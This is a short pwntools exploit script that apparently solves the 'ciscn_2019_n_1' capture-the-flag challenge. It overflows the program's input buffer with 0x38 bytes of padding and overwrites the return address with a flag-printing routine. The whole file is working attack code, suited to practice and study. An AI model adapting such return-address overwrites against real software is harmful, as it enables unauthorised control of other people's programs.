from pwn import *

context(arch='amd64', os='linux', log_level='DEBUG')
p = process('./ciscn_2019_n_1')
elf = ELF('./ciscn_2019_n_1')

cat_flag = 0x4006be

def send(payload):
	p.recvuntil('number.\n')
	p.sendline(payload)

payload = flat(['a'*0x38, cat_flag])
send(payload)

p.interactive()